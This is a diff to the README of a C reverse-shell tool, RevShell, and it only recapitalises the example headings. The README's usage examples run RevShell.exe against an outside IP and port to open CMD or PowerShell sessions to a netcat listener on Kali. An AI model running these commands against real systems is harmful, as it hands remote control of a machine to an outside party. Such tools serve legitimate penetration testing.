@@ -17,7 +17,7 @@ This is a simple C-based reverse shell used to open a _CMD_ or _PowerShell_ sess
 ## Examples
 Before starting the executable make sure you have started a listener on your favorite (Linux) distribution. I use netcat on Kali Linux.
 
-> Open a cmd session
+> Open a CMD session
 ```
 C:\RevShell> RevShell.exe 195.135.15.7 12345
 [+] SELECTED SHELL:     0
@@ -25,7 +25,7 @@ C:\RevShell> RevShell.exe 195.135.15.7 12345
 [+] VALID IP PORT:      12345
 ```
 
-> Open a cmd session
+> Open a CMD session
 ```
 C:\RevShell> RevShell.exe 195.135.15.7 12345 cmd
 [+] SELECTED SHELL:     0
@@ -33,7 +33,7 @@ C:\RevShell> RevShell.exe 195.135.15.7 12345 cmd
 [+] VALID IP PORT:      12345
 ```
 
-> Open a powershell session
+> Open a PowerShell session
 ```
 C:\RevShell> RevShell.exe 195.135.15.7 12345 powershell
 [+] SELECTED SHELL:     0
